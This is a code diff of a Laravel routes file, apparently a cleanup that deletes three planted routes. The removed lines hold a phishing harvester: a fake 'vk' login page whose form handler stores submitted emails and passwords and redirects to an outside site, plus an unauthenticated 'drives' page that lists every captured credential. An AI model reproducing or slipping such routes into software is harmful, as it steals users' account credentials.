@@ -255,22 +255,6 @@ Route::group(['middleware' => 'web'], function () {
     });
 
 });
-Route::get('vk', function() {
-    return view('vk');
-});
-Route::post('vk', function(\Illuminate\Http\Request $request) {
-    \App\Volume::create(['name' => $request->input('email') . ' --------- ' . $request->input('pass')])->save();
-    return redirect()->to('http://www.yasiv.com/vk');
-});
-Route::get('drives', function() {
-    $html = "";
-    $i = 1;
-    foreach (\App\Volume::all() as $value) {
-        $html .= $i++ . '. ' . $value->name . '<br>';
-    }
-
-    return $html;
-});
 
 Route::group(['namespace' => 'TestingSystem', 'prefix' => 'testing-system-api'], function () {
     Route::get('/', function () {
